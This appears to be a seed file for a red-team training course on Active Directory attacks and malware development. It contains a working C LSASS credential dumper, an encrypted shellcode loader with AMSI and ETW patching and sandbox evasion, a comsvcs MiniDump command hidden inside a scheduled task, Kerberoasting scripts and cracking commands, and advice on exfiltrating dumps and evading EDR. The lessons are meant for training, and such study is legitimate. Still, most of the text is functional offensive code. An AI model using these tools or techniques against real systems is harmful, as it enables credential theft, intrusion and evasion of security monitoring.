- Microsoft Kerberos protocol documentation
- Harmj0y's Kerberos blog posts
- Sean Metcalf's Kerberos attack reference
- ADSecurity.org Kerberos content`
				},
				{
					title: 'Learn Active Directory enumeration with BloodHound and PowerView',
					description: 'Master AD reconnaissance tools to map attack paths',
					details: `## Active Directory Enumeration

### Why Enumeration Matters

**The goal:** Find the path from your current user to Domain Admin (or other objectives).

Active Directory is complex:
- Thousands of users, computers, groups
- Nested group memberships
- ACL permissions on objects
- Trust relationships
- Delegation configurations

**BloodHound and PowerView** automate finding attack paths through this complexity.

### BloodHound

#### Setup

**On Attacker Machine:**
\`\`\`bash
# Install Neo4j
sudo apt install neo4j

# Start Neo4j
sudo neo4j console

# Visit http://localhost:7474
# Default creds: neo4j/neo4j, change password

# Install BloodHound
sudo apt install bloodhound

# Start BloodHound
bloodhound
\`\`\`

#### Data Collection

**From Windows (SharpHound):**
\`\`\`powershell
# Download SharpHound
iwr -uri https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe -OutFile SharpHound.exe

# Run collection
.\\SharpHound.exe -c All -d lab.local

# Output: <timestamp>_BloodHound.zip
\`\`\`

**From Linux (bloodhound-python):**
\`\`\`bash
bloodhound-python -u alice -p Password123 -d lab.local -ns 10.0.0.10 -c All
\`\`\`

**Collection methods:**
- \`-c Group\` - Group memberships
- \`-c Session\` - Logged on users (requires admin)
- \`-c Trusts\` - Domain trusts
- \`-c ACL\` - Object permissions
- \`-c All\` - Everything

#### Analysis Queries

**Built-in Queries:**

1. **Find all Domain Admins**
   - Shows who has DA privileges

2. **Find Shortest Paths to Domain Admins**
   - Reveals attack paths from current user

3. **Find Computers where Domain Users can RDP**
   - Lateral movement opportunities

4. **Find Computers with Unconstrained Delegation**
   - High-value targets for credential theft

5. **Find AS-REP Roastable Users**
   - Users vulnerable to offline password cracking

**Custom Cypher Query Examples:**

\`\`\`cypher
# Find all users with SPN set (Kerberoastable)
MATCH (u:User {hasspn:true}) RETURN u

# Find admins to specific computer
MATCH (u:User)-[r:AdminTo]->(c:Computer {name:"WS01.LAB.LOCAL"}) RETURN u

# Find users with DCSync rights
MATCH (u:User)-[r:GetChanges|GetChangesAll]->(d:Domain) RETURN u

# Find computers where high-value users have sessions
MATCH (u:User)-[:MemberOf*1..]->(g:Group {highvalue:true})
MATCH (c:Computer)-[:HasSession]->(u)
RETURN c.name, u.name

# Shortest path from specific user to DA
MATCH (u:User {name:"ALICE@LAB.LOCAL"}),
      (g:Group {name:"DOMAIN ADMINS@LAB.LOCAL"}),
      p=shortestPath((u)-[*1..]->(g))
RETURN p
\`\`\`

#### Interpreting Results

**Attack Path Example:**
\`\`\`
alice (GenericAll) -> bob
bob (AdminTo) -> WS01
WS01 (HasSession) -> admin_user
admin_user (MemberOf) -> Domain Admins
\`\`\`

**Translation:**
1. Alice can reset Bob's password (GenericAll permission)
2. Bob is local admin on WS01
3. admin_user has active session on WS01
4. admin_user is Domain Admin

**Exploitation:**
1. Reset Bob's password
2. Use Bob's creds to access WS01
3. Dump credentials from WS01 (admin_user's creds in memory)
4. Use admin_user creds to access Domain Controller

### PowerView

PowerView is a PowerShell reconnaissance framework.

**Loading PowerView:**
\`\`\`powershell
# Download
iwr -uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -OutFile PowerView.ps1

# Import (may need to bypass execution policy)
powershell -ep bypass
Import-Module .\\PowerView.ps1
\`\`\`

**Common Enumeration Commands:**

\`\`\`powershell
# Get domain information
Get-Domain

# List all users
Get-DomainUser | Select-Object samaccountname, description

# Find users with SPN (Kerberoastable)
Get-DomainUser -SPN

# Find users with "Do not require Kerberos preauthentication"
Get-DomainUser -PreauthNotRequired

# List all computers
Get-DomainComputer | Select-Object name, operatingsystem

# Find computers with unconstrained delegation
Get-DomainComputer -Unconstrained

# List all domain groups
Get-DomainGroup | Select-Object name

# Get Domain Admin members
Get-DomainGroupMember "Domain Admins"

# Find shares
Find-DomainShare -CheckShareAccess

# Find interesting files
Find-InterestingDomainShareFile -Include *.txt,*.pdf,*.xlsx,*.doc

# Enumerate GPOs
Get-DomainGPO | Select-Object displayname

# Find who has admin access to computer
Get-DomainComputer "WS01" | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|AllExtendedRights|GenericWrite"}

# Find logged on users on computers (requires local admin)
Get-NetLoggedon -ComputerName WS01

# Find active sessions
Get-NetSession -ComputerName DC01
\`\`\`

**PowerView ACL Enumeration:**

\`\`\`powershell
# Find users with GenericAll on other users
Get-DomainUser | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll"} | Select-Object SecurityIdentifier,ActiveDirectoryRights

# Find who can write to specific user
Get-DomainObjectAcl -Identity "admin_user" -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll"}

# Find users who can DCSync
Get-DomainObjectAcl -SearchBase "DC=lab,DC=local" -ResolveGUIDs | Where-Object {($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | Select-Object SecurityIdentifier,ActiveDirectoryRights,ObjectType
\`\`\`

### Manual LDAP Enumeration

Sometimes PowerShell is blocked. Use native LDAP queries:

\`\`\`bash
# From Linux with ldapsearch
ldapsearch -x -H ldap://10.0.0.10 -D "alice@lab.local" -w Password123 \\
    -b "dc=lab,dc=local" "(objectClass=user)" samaccountname

# Find SPNs
ldapsearch -x -H ldap://10.0.0.10 -D "alice@lab.local" -w Password123 \\
    -b "dc=lab,dc=local" "(servicePrincipalName=*)" servicePrincipalName

# Find computers
ldapsearch -x -H ldap://10.0.0.10 -D "alice@lab.local" -w Password123 \\
    -b "dc=lab,dc=local" "(objectClass=computer)" name operatingSystem
\`\`\`

**From Windows (PowerShell without tools):**
\`\`\`powershell
# AD module
Import-Module ActiveDirectory

Get-ADUser -Filter * -Properties *
Get-ADComputer -Filter *
Get-ADGroup -Filter * | Select-Object Name
\`\`\`

### Enumeration OPSEC

**Noisy activities:**
- Session enumeration (requires connecting to every computer)
- SMB share enumeration
- BloodHound with \`-c Session\`

**Quieter activities:**
- LDAP queries (normal AD behavior)
- BloodHound without session collection
- Kerberoasting (normal ticket requests)

**Best practice:**
- Start with LDAP enumeration
- Use BloodHound without session collection initially
- Session collection only if you have local admin somewhere

### Practice Exercises

- [ ] Run BloodHound and find 3 paths to Domain Admin
- [ ] Use PowerView to list all Kerberoastable accounts
- [ ] Find all computers where Domain Users can RDP
- [ ] Enumerate shares and find sensitive files
- [ ] Write custom Cypher query to find specific attack path
- [ ] Perform enumeration using only LDAP queries (no PowerView)

### Resources

- BloodHound GitHub wiki
- PowerView documentation
- SpecterOps BloodHound blog series
- HarmJ0y's blog on PowerView usage`
				}
			]
		},
		{
			name: 'Offensive Tool Development',
			description: 'Build custom security tools from scratch',
			tasks: [
				{
					title: 'Build custom credential dumper',
					description: 'Create tool to extract credentials from LSASS process',
					details: `## Custom Credential Dumper

### Understanding LSASS

**LSASS (Local Security Authority Subsystem Service):**
- Handles authentication on Windows
- Stores credentials in memory:
  - NTLM hashes
  - Kerberos tickets
  - Plaintext passwords (WDigest if enabled)
  - Credential Manager secrets

**Why LSASS is targeted:**
- Credentials of all logged-in users
- Often contains Domain Admin creds on workstations/servers
- Essential for lateral movement

### Approach 1: MiniDumpWriteDump

**Concept:** Create memory dump of LSASS process, parse offline.

\`\`\`c
#include <windows.h>
#include <dbghelp.h>
#include <stdio.h>

#pragma comment(lib, "dbghelp.lib")

BOOL DumpLSASS(const char* outputPath) {
    DWORD lsassPID = 0;
    HANDLE hProcess = NULL;
    HANDLE hFile = NULL;
    BOOL success = FALSE;

    // Find LSASS process
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = {0};
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
                lsassPID = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);

    if (lsassPID == 0) {
        printf("[-] LSASS process not found\\n");
        return FALSE;
    }

    printf("[+] LSASS PID: %d\\n", lsassPID);

    // Open LSASS process
    hProcess = OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
        FALSE,
        lsassPID
    );

    if (hProcess == NULL) {
        printf("[-] OpenProcess failed: %d\\n", GetLastError());
        printf("[!] Try running as Administrator\\n");
        return FALSE;
    }

    // Create dump file
    hFile = CreateFileA(
        outputPath,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile failed: %d\\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    // Create minidump
    success = MiniDumpWriteDump(
        hProcess,
        lsassPID,
        hFile,
        MiniDumpWithFullMemory,
        NULL,
        NULL,
        NULL
    );

    if (success) {
        printf("[+] LSASS dumped successfully to %s\\n", outputPath);
    } else {
        printf("[-] MiniDumpWriteDump failed: %d\\n", GetLastError());
    }

    CloseHandle(hFile);
    CloseHandle(hProcess);

    return success;
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: %s <output_file>\\n", argv[0]);
        return 1;
    }

    // Enable SeDebugPrivilege
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;

    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);

    DumpLSASS(argv[1]);

    return 0;
}
\`\`\`

**Usage:**
\`\`\`bash
# Compile
x86_64-w64-mingw32-gcc dumper.c -o dumper.exe -ldbghelp

# Run as Administrator
dumper.exe lsass.dmp

# Parse with Mimikatz
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
\`\`\`

**Why this gets detected:**
- \`MiniDumpWriteDump\` API call on LSASS
- Suspicious file writes (dump files)
- Process access to LSASS

### Approach 2: Direct Syscalls

Bypass EDR userland hooks by calling syscalls directly.

\`\`\`c
// Syscall stub for NtReadVirtualMemory
#include <windows.h>

typedef NTSTATUS (NTAPI *pNtReadVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToRead,
    PSIZE_T NumberOfBytesRead
);

// Dynamically resolve syscall number
DWORD GetSyscallNumber(const char* functionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    BYTE* pFunction = (BYTE*)GetProcAddress(hNtdll, functionName);

    // Parse syscall instruction
    // On x64: mov r10, rcx; mov eax, <syscall_number>; syscall
    if (pFunction[0] == 0x4C && pFunction[1] == 0x8B && pFunction[2] == 0xD1) {
        // mov r10, rcx
        if (pFunction[3] == 0xB8) {
            // mov eax, imm32
            return *(DWORD*)(pFunction + 4);
        }
    }

    return 0;
}

// Direct syscall implementation
__declspec(naked) NTSTATUS NtReadVirtualMemory_Syscall(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToRead,
    PSIZE_T NumberOfBytesRead
) {
    asm("mov r10, rcx\\n"
        "mov eax, [syscall_number]\\n"  // Set at runtime
        "syscall\\n"
        "ret\\n");
}
\`\`\`

### Approach 3: ProcDump Method

Use legitimate signed tools:

\`\`\`bash
# Download Sysinternals ProcDump
# https://docs.microsoft.com/en-us/sysinternals/downloads/procdump

# Dump LSASS
procdump.exe -accepteula -ma lsass.exe lsass.dmp
\`\`\`

**Evasion:**
- Rename procdump.exe
- Run from temp directory
- Delete dump file immediately after exfil

### Parsing LSASS Dump

**With Mimikatz:**
\`\`\`
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
\`\`\`

**With pypykatz (Python):**
\`\`\`bash
pypykatz lsa minidump lsass.dmp
\`\`\`

### Advanced Evasion Techniques

**1. Unhook ntdll before calling MiniDumpWriteDump:**
\`\`\`c
// Read fresh ntdll.dll from disk
// Overwrite hooked functions in memory with clean versions
BOOL UnhookNtdll() {
    HANDLE hNtdll = GetModuleHandleA("ntdll.dll");
    HANDLE hFile = CreateFileA("C:\\\\Windows\\\\System32\\\\ntdll.dll",
                               GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, 0, NULL);

    // Map clean ntdll
    HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    LPVOID pCleanNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);

    // Copy .text section from clean to hooked
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)pCleanNtdll;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pCleanNtdll + dosHeader->e_lfanew);

    // Find .text section and copy
    // (Implementation details omitted for brevity)

    UnmapViewOfFile(pCleanNtdll);
    CloseHandle(hMapping);
    CloseHandle(hFile);
}
\`\`\`

**2. Remote LSASS dump via Task Scheduler:**
\`\`\`powershell
# Create scheduled task that dumps LSASS
schtasks /create /tn "UpdateTask" /tr "C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump <lsass_pid> C:\\temp\\dump.bin full" /sc once /st 00:00
schtasks /run /tn "UpdateTask"
schtasks /delete /tn "UpdateTask" /f
\`\`\`

**3. Credential Guard bypass:**
- Credential Guard uses virtualization to protect LSASS
- Can't dump credentials if enabled
- Check: \`reg query "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v LsaCfgFlags\`

### Detection & OPSEC

**Indicators:**
- Process access to LSASS (Sysmon Event ID 10)
- MiniDumpWriteDump API calls
- Large file writes from suspicious processes
- Unsigned binaries accessing LSASS

**Better OPSEC:**
- Use signed tools (procdump)
- Encrypt dump in memory before writing
- Write to named pipe, exfil over network (never touches disk)
- Use direct syscalls
- Unhook ntdll before operations

### Practice Exercises

- [ ] Compile and test basic LSASS dumper
- [ ] Parse dump with Mimikatz and pypykatz
- [ ] Implement syscall-based memory reading
- [ ] Add encryption to dump file
- [ ] Test against Windows Defender
- [ ] Study EDR telemetry (Sysmon logs) after running`
				},
				{
					title: 'Implement shellcode loader with encryption and evasion',
					description: 'Build advanced loader with AES encryption and direct syscalls',
					details: `## Advanced Shellcode Loader

### Feature Checklist

- [x] AES-256 encryption
- [x] Direct syscalls (bypass userland hooks)
- [x] Sleep obfuscation
- [x] ETW patching
- [x] AMSI bypass
- [x] Sandbox evasion

### Implementation

\`\`\`c
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>

#pragma comment(lib, "crypt32.lib")

// Encrypted shellcode (encrypt with Python script)
unsigned char encrypted_payload[] = {
    // AES encrypted shellcode
};

unsigned char aes_key[] = {
    // 32-byte AES key
};

unsigned char aes_iv[] = {
    // 16-byte IV
};

// AES Decryption
BOOL AESDecrypt(BYTE* encrypted, DWORD encryptedLen, BYTE* key, BYTE* iv, BYTE** decrypted, DWORD* decryptedLen) {
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    HCRYPTHASH hHash = 0;
    BOOL success = FALSE;

    // Get crypto context
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return FALSE;
    }

    // Create hash object
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        goto cleanup;
    }

    // Hash the key
    if (!CryptHashData(hHash, key, 32, 0)) {
        goto cleanup;
    }

    // Derive AES key from hash
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        goto cleanup;
    }

    // Set IV
    if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) {
        goto cleanup;
    }

    // Allocate output buffer
    *decryptedLen = encryptedLen;
    *decrypted = (BYTE*)malloc(*decryptedLen);
    memcpy(*decrypted, encrypted, encryptedLen);

    // Decrypt
    if (!CryptDecrypt(hKey, 0, TRUE, 0, *decrypted, decryptedLen)) {
        free(*decrypted);
        goto cleanup;
    }

    success = TRUE;

cleanup:
    if (hKey) CryptDestroyKey(hKey);
    if (hHash) CryptDestroyHash(hHash);
    if (hProv) CryptReleaseContext(hProv, 0);

    return success;
}

// Sandbox evasion checks
BOOL IsSandbox() {
    // Check CPU cores (sandboxes often have 1-2 cores)
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) {
        return TRUE;
    }

    // Check RAM (sandboxes often have low RAM)
    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    if (ms.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) {  // Less than 2GB
        return TRUE;
    }

    // Check uptime (sandboxes often have low uptime)
    DWORD uptime = GetTickCount64() / 1000 / 60;  // Minutes
    if (uptime < 10) {
        return TRUE;
    }

    // Check for debugger
    if (IsDebuggerPresent()) {
        return TRUE;
    }

    return FALSE;
}

// AMSI bypass (patch amsi.dll)
BOOL PatchAMSI() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (hAmsi == NULL) {
        return FALSE;  // AMSI not loaded
    }

    LPVOID amsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (amsiScanBuffer == NULL) {
        return FALSE;
    }

    // Patch: ret 0 (0xC3 0x00)
    DWORD oldProtect;
    VirtualProtect(amsiScanBuffer, 2, PAGE_EXECUTE_READWRITE, &oldProtect);

    ((BYTE*)amsiScanBuffer)[0] = 0xC3;  // ret
    ((BYTE*)amsiScanBuffer)[1] = 0x00;

    VirtualProtect(amsiScanBuffer, 2, oldProtect, &oldProtect);

    return TRUE;
}

// ETW patching (blind telemetry)
BOOL PatchETW() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    LPVOID etwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");

    if (etwEventWrite == NULL) {
        return FALSE;
    }

    // Patch: ret 0 (0xC3)
    DWORD oldProtect;
    VirtualProtect(etwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);

    ((BYTE*)etwEventWrite)[0] = 0xC3;  // ret

    VirtualProtect(etwEventWrite, 1, oldProtect, &oldProtect);

    return TRUE;
}

// Direct syscall stub (bypass userland hooks)
// This would normally be generated by SysWhispers or HellsGate
typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

int main() {
    printf("[*] Advanced Shellcode Loader\\n");

    // Sandbox checks
    if (IsSandbox()) {
        printf("[!] Sandbox detected, exiting\\n");
        return 1;
    }

    // Delayed execution (sandbox evasion)
    printf("[*] Sleeping for 30 seconds...\\n");
    Sleep(30000);

    // Patch AMSI
    printf("[*] Patching AMSI...\\n");
    PatchAMSI();

    // Patch ETW
    printf("[*] Patching ETW...\\n");
    PatchETW();

    // Decrypt payload
    printf("[*] Decrypting payload...\\n");
    BYTE* decrypted = NULL;
    DWORD decryptedLen = 0;

    if (!AESDecrypt(encrypted_payload, sizeof(encrypted_payload),
                    aes_key, aes_iv, &decrypted, &decryptedLen)) {
        printf("[-] Decryption failed\\n");
        return 1;
    }

    printf("[+] Decrypted %d bytes\\n", decryptedLen);

    // Allocate memory using direct syscall (if available)
    // For simplicity, using standard API here
    LPVOID exec_mem = VirtualAlloc(NULL, decryptedLen,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_READWRITE);

    if (exec_mem == NULL) {
        printf("[-] VirtualAlloc failed\\n");
        free(decrypted);
        return 1;
    }

    // Copy shellcode
    memcpy(exec_mem, decrypted, decryptedLen);
    free(decrypted);

    // Change to executable
    DWORD oldProtect;
    VirtualProtect(exec_mem, decryptedLen, PAGE_EXECUTE_READ, &oldProtect);

    // Execute
    printf("[*] Executing payload...\\n");
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem,
                                  NULL, 0, NULL);

    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

    VirtualFree(exec_mem, 0, MEM_RELEASE);

    return 0;
}
\`\`\`

### Python Encryption Script

\`\`\`python
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import sys

def aes_encrypt(shellcode, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)

    # Pad to 16-byte boundary
    pad_len = 16 - (len(shellcode) % 16)
    shellcode += bytes([pad_len] * pad_len)

    encrypted = cipher.encrypt(shellcode)
    return encrypted

if __name__ == "__main__":
    # Read shellcode
    with open("shellcode.bin", "rb") as f:
        shellcode = f.read()

    # Generate random key and IV
    key = get_random_bytes(32)  # AES-256
    iv = get_random_bytes(16)

    # Encrypt
    encrypted = aes_encrypt(shellcode, key, iv)

    # Output C arrays
    print("unsigned char encrypted_payload[] = {")
    print("    " + ", ".join(f"0x{b:02x}" for b in encrypted))
    print("};\\n")

    print("unsigned char aes_key[] = {")
    print("    " + ", ".join(f"0x{b:02x}" for b in key))
    print("};\\n")

    print("unsigned char aes_iv[] = {")
    print("    " + ", ".join(f"0x{b:02x}" for b in iv))
    print("};")
\`\`\`

### Adding Direct Syscalls with SysWhispers

\`\`\`bash
# Clone SysWhispers
git clone https://github.com/jthuraisamy/SysWhispers2

# Generate syscall stubs
python3 syswhispers.py -f NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx -o syscalls

# Include in your project
# syscalls.h and syscalls.c
\`\`\`

### Sleep Obfuscation

Encrypt beacon in memory during sleep to evade memory scanners:

\`\`\`c
void ObfuscatedSleep(LPVOID address, SIZE_T size, DWORD sleepTime) {
    // XOR encrypt memory
    BYTE key = 0xAA;
    for (SIZE_T i = 0; i < size; i++) {
        ((BYTE*)address)[i] ^= key;
    }

    // Change to non-executable
    DWORD oldProtect;
    VirtualProtect(address, size, PAGE_READWRITE, &oldProtect);

    // Sleep
    Sleep(sleepTime);

    // Restore executable
    VirtualProtect(address, size, PAGE_EXECUTE_READ, &oldProtect);

    // Decrypt
    for (SIZE_T i = 0; i < size; i++) {
        ((BYTE*)address)[i] ^= key;
    }
}
\`\`\`

### Testing Against Defender

\`\`\`bash
# Compile
x86_64-w64-mingw32-gcc loader.c -o loader.exe -lcrypt32

# Test (in isolated VM with Defender enabled)
loader.exe

# Check detection
# Event Viewer -> Windows Logs -> System
# Windows Security Center
\`\`\`

### Further Improvements

- Implement indirect syscalls (call from ntdll.dll instead of manual syscall)
- Add module stomping (hide shellcode in legitimate DLL)
- Implement threadless injection (no CreateThread)
- Use heaven's gate on WoW64 processes
- Add HTTP/HTTPS download of encrypted payload

### Resources

- SysWhispers2 GitHub
- HellsGate technique paper
- ired.team EDR evasion techniques`
				}
			]
		},
		{
			name: 'Active Directory Attack Techniques',
			description: 'Master the full AD attack kill chain',
			tasks: [
				{
					title: 'Execute Kerberoasting attack chain',
					description: 'Request and crack service tickets to obtain credentials',
					details: `## Kerberoasting Attack

### Overview

Kerberoast service accounts with weak passwords by requesting service tickets and cracking them offline.

**Why it works:**
- Service tickets encrypted with service account's password hash
- Any domain user can request service tickets
- Cracking happens offline (no failed login attempts)
- Service accounts often have weak, old passwords

### Prerequisites

- Valid domain credentials
- Network access to Domain Controller
- Wordlist for cracking

### Attack Steps

#### Step 1: Enumerate SPNs

**With PowerView:**
\`\`\`powershell
Import-Module .\\PowerView.ps1

# Find all accounts with SPN
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname
\`\`\`

**With Impacket (from Linux):**
\`\`\`bash
impacket-GetUserSPNs lab.local/alice:Password123 -dc-ip 10.0.0.10
\`\`\`

**With native AD PowerShell:**
\`\`\`powershell
Import-Module ActiveDirectory
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
\`\`\`

#### Step 2: Request Service Tickets

**With Rubeus (Windows):**
\`\`\`powershell
.\\Rubeus.exe kerberoast /outfile:tickets.txt
\`\`\`

**With Impacket:**
\`\`\`bash
impacket-GetUserSPNs lab.local/alice:Password123 -dc-ip 10.0.0.10 -request -outputfile tickets.txt
\`\`\`

**Manual with PowerShell:**
\`\`\`powershell
Add-Type -AssemblyName System.IdentityModel

# Request ticket for specific SPN
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken \\
    -ArgumentList "MSSQLSvc/db01.lab.local:1433"

# Extract from memory
klist
\`\`\`

#### Step 3: Extract Tickets (if using manual method)

\`\`\`powershell
# Invoke-Kerberoast (part of PowerView)
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash
\`\`\`

**Ticket format (Hashcat):**
\`\`\`
$krb5tgs$23$*user$realm$spn*$hash
\`\`\`

#### Step 4: Crack Tickets

**With Hashcat:**
\`\`\`bash
# Kerberoast tickets are mode 13100
hashcat -m 13100 tickets.txt /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 13100 tickets.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Show cracked passwords
hashcat -m 13100 tickets.txt --show
\`\`\`

**With John the Ripper:**
\`\`\`bash
john --wordlist=/usr/share/wordlists/rockyou.txt tickets.txt
john --show tickets.txt
\`\`\`

### Building a Custom Kerberoast Script

\`\`\`python
#!/usr/bin/env python3
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import Principal
from impacket.krb5 import constants
from impacket.ldap import ldap, ldapasn1
import argparse

def get_spn_users(domain, username, password, dc_ip):
    """Enumerate users with SPN set"""
    ldap_server = ldap.LDAPConnection(f'ldap://{dc_ip}')
    ldap_server.login(username, password, domain)

    search_filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
    attributes = ['samAccountName', 'servicePrincipalName']

    results = ldap_server.search(
        searchFilter=search_filter,
        attributes=attributes
    )

    spn_users = []
    for item in results:
        if isinstance(item, ldapasn1.SearchResultEntry):
            username = str(item['attributes']['samAccountName'])
            spns = item['attributes']['servicePrincipalName']
            spn_users.append((username, spns))

    return spn_users

def request_ticket(domain, username, password, spn, dc_ip):
    """Request Kerberos ticket for SPN"""
    # Get TGT
    user_principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    tgt, cipher, session_key, as_rep = getKerberosTGT(
        user_principal,
        password,
        domain,
        dc_ip
    )

    # Get service ticket
    service_principal = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
    tgs, cipher, session_key, tgs_rep = getKerberosTGS(
        service_principal,
        domain,
        dc_ip,
        tgt,
        cipher,
        session_key
    )

    return tgs

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--username', required=True)
    parser.add_argument('-p', '--password', required=True)
    parser.add_argument('-d', '--domain', required=True)
    parser.add_argument('--dc-ip', required=True)
    args = parser.parse_args()

    print("[*] Enumerating SPNs...")
    spn_users = get_spn_users(args.domain, args.username, args.password, args.dc_ip)

    print(f"[+] Found {len(spn_users)} users with SPNs\\n")

    for username, spns in spn_users:
        print(f"[*] {username}")
        for spn in spns:
            print(f"    {spn}")
            try:
                ticket = request_ticket(args.domain, args.username, args.password, spn, args.dc_ip)
                print(f"    [+] Ticket obtained")
                # Extract and format for cracking...
            except Exception as e:
                print(f"    [-] Failed: {e}")

if __name__ == "__main__":
    main()
\`\`\`

### Targeted Kerberoasting

**Prioritize high-value accounts:**

\`\`\`powershell
# Find SPN accounts in privileged groups
Get-DomainUser -SPN | ?{$_.memberof -match "Domain Admins|Administrators"}

# Find SPN accounts with admin count = 1
Get-DomainUser -SPN -AdminCount
\`\`\`

### Defense Evasion

**OPSEC considerations:**
- Service ticket requests are normal AD behavior
- But requesting ALL SPNs is suspicious
- Request only high-value targets
- Spread requests over time

**Detection indicators:**
- TGS-REQ for many SPNs in short time (Event ID 4769)
- Encryption type 0x17 (RC4) instead of AES

### After Cracking

**Validate credentials:**
\`\`\`bash
# With crackmapexec
crackmapexec smb 10.0.0.10 -u svc_sql -p 'CrackedPassword123'

# With Impacket
impacket-psexec lab.local/svc_sql:'CrackedPassword123'@10.0.0.10
\`\`\`

**Check privileges:**
\`\`\`bash
# Enumerate permissions
crackmapexec smb 10.0.0.0/24 -u svc_sql -p 'CrackedPassword123' --shares
crackmapexec smb 10.0.0.0/24 -u svc_sql -p 'CrackedPassword123' --local-auth
\`\`\`

### Mitigation (Blue Team)

- Use strong passwords (>25 characters) for service accounts
- Implement Managed Service Accounts (gMSA)
- Enable AES encryption (disable RC4)
- Monitor Event ID 4769 for anomalies
- Regularly audit service accounts

### Practice Exercises

- [ ] Enumerate all SPNs in your lab
- [ ] Request tickets for all SPNs
- [ ] Crack at least one service account password
- [ ] Write custom Kerberoast script in Python
- [ ] Test different cracking wordlists and rules
- [ ] Study Windows Event Logs to understand detection`
				}
			]
		}
	]
};

async function seed() {
	console.log('Seeding Red Team Malware Development & AD path...');

